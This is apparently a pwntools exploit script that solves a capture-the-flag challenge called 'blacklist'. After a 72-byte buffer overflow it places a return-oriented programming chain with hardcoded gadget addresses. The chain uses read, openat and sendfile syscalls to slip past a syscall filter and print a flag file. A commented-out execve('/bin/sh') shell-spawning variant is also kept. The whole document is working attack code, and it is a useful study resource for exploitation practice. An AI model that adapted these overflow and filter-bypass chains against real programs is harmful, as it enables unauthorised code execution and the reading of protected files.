from pwn import *

exe = './blacklist'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
gdbscript = '''
b * 0x401dd4
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# gadgets

pop_rdi = p64(0x00000000004017b6)
pop_rsi = p64(0x00000000004024f6)
pop_rdx = p64(0x0000000000401db2)
pop_rcx = p64(0x0000000000401d6e)
pop_rax = p64(0x0000000000401daf)
pop_r8  = p64(0x0000000000401dae)
pop_r10 = p64(0x0000000000401db1)
ret     = p64(0x0000000000432980)
syscall = p64(0x000000000041860c)
movrdirax  = p64(0x47652e)
p = start()

# syscalls

l = 72*b"a" 
read1 =  pop_rdi + p64(0x0) + pop_rsi + p64(0x4b2000) + pop_rdx + p64(50) + pop_rax + p64(0x0) + syscall
openat =  pop_rdi + p64(0x127) + pop_rsi + p64(0x4b2000) + pop_rdx + p64(0x0) + pop_r10 + p64(0x0) + pop_rax + p64(0x101) + syscall
sendfile =  pop_rdi+ p64(0x1) + pop_rsi + p64(0x3) + pop_rdx + p64(0x0) + pop_rax + p64(0x28) + pop_r10 + p64(0x32) + syscall
sysexit = pop_rdi + p64(0) + pop_rax + p64(0x3c) + syscall
payload = l + read1 + openat + sendfile + sysexit
# execve = pop_rdi + p64(0x4b2000) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + pop_rax + p64(0x3b) + syscall
# payload = l + read1 + execve + sysexit
# Trying execve to understand how program halts execution :: sigsys and bad system call
p.sendline(payload)
p.send("/home/r0r1/Desktop/bi0ss2/pwn/17-06-2023/flag.txt\x00")
# p.send("/bin/sh\x00")

p.interactive()

